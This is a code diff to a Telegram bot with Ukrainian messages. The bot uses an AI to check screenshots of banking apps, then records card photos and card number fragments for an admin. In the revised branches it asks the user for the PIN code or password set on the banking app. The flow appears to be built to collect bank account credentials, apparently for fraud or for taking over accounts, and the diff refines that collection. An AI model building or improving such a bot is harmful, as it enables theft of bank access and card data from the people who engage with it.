@@ -786,23 +786,34 @@ async def process_card_screenshot(message: Message, state: FSMContext, bot: Bot)
         card_last4 = card_match.group(2)
         await state.update_data(card_first4=card_first4, card_last4=card_last4)
         
-    await state.update_data(card_photo_id=photo.file_id)
-    # Оновлюємо базу даних, щоб адмін бачив реквізити та фото картки
-    await db.update_session_verification_data(
-        client_id, 
-        success_photo_id=existing_session['success_photo_id'], 
-        card_first4=card_first4, 
-        card_last4=card_last4,
-        card_photo_id=photo.file_id
-    )
+    if "[KD_CARD_SCREEN]" in response:
+        await state.update_data(card_photo_id=photo.file_id)
+        # Оновлюємо базу даних, щоб адмін бачив реквізити та фото картки
+        await db.update_session_verification_data(
+            client_id, 
+            success_photo_id=existing_session['success_photo_id'], 
+            card_first4=card_first4, 
+            card_last4=card_last4,
+            card_photo_id=photo.file_id
+        )
 
-    # Запитуємо пін-код
-    success_text = (
-        "Дякую! Другий скріншот з карткою прийнято.\n\n"
-        "Який пін-код чи пароль ставили на додаток?"
-    )
-    await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
-    await state.set_state(RegistrationStates.waiting_password)
+        # Запитуємо пін-код
+        success_text = (
+            "Дякую! Другий скріншот з карткою прийнято.\n\n"
+            "Який пін-код чи пароль ставили на додаток?"
+        )
+        await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+        await state.set_state(RegistrationStates.waiting_password)
+        return
+    elif "[KD_MAIN_SCREEN]" in response:
+        # Клієнт знову надіслав головний екран!
+        error_text = "Надішліть, будь ласка, саме скріншот з вкладки «Картки» (там, де видно реквізити картки). Ви надіслали той самий скріншот головного меню!"
+        await message.answer(error_text)
+        return
+    else:
+        # Немає розпізнаних екранів (можливо, якась інша помилка чи текст від ШІ)
+        await message.answer(response)
+        return
 
 @router.message(RegistrationStates.waiting_card_screenshot, F.chat.type == "private")
 async def handle_card_screenshot_text(message: Message):
@@ -980,22 +991,35 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
             current_bank_name=current_bank_name
         )
         
-        if "[SUCCESS_VERIFICATION]" in response:
-            # Перевіряємо, чи це bank.kd або LvivBank
-            is_bank_kd = current_bank_name and "bank.kd" in current_bank_name.lower()
-            is_lvivbank = current_bank_name and "lviv" in current_bank_name.lower()
+        is_bank_kd = current_bank_name and "bank.kd" in current_bank_name.lower()
+        is_lvivbank = current_bank_name and "lviv" in current_bank_name.lower()
+        bank_label = current_bank_name if current_bank_name else "банк"
 
-            # Парсимо маску картки, якщо вона є
+        if is_bank_kd:
             card_first4, card_last4 = None, None
             card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
             if card_match:
                 card_first4 = card_match.group(1)
                 card_last4 = card_match.group(2)
                 await state.update_data(card_first4=card_first4, card_last4=card_last4)
-            
-            bank_label = current_bank_name if current_bank_name else "банк"
-            
-            if is_bank_kd:
+
+            if "[KD_CARD_SCREEN]" in response:
+                success_text = (
+                    "Дякую! Скріншот з реквізитами картки прийнято.\n\n"
+                    "Який пін-код чи пароль ставили на додаток?"
+                )
+                await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+                await state.update_data(success_photo_id=photo.file_id, card_photo_id=photo.file_id)
+                await db.update_session_verification_data(
+                    client_id, 
+                    success_photo_id=photo.file_id, 
+                    card_first4=card_first4, 
+                    card_last4=card_last4,
+                    card_photo_id=photo.file_id
+                )
+                await state.set_state(RegistrationStates.waiting_password)
+                return
+            elif "[KD_MAIN_SCREEN]" in response:
                 kd_prompt = (
                     "Дякую! Перший скріншот прийнято.\n\n"
                     "Тепер, будь ласка, перейдіть у вкладку \"Картки\" (або натисніть на саму картку), "
@@ -1006,7 +1030,20 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
                 await db.update_session_verification_data(client_id, success_photo_id=photo.file_id, card_first4=card_first4, card_last4=card_last4)
                 await state.set_state(RegistrationStates.waiting_card_screenshot)
                 return
-            elif is_lvivbank:
+            else:
+                await message.answer(response)
+                return
+
+        if "[SUCCESS_VERIFICATION]" in response:
+            # Парсимо маску картки, якщо вона є
+            card_first4, card_last4 = None, None
+            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
+            if card_match:
+                card_first4 = card_match.group(1)
+                card_last4 = card_match.group(2)
+                await state.update_data(card_first4=card_first4, card_last4=card_last4)
+            
+            if is_lvivbank:
                 success_text = (
                     f"Чудово {bank_label} успішно зареєстрували.\n\n"
                     f"Будь ласка, напишіть Ваш номер телефону?"
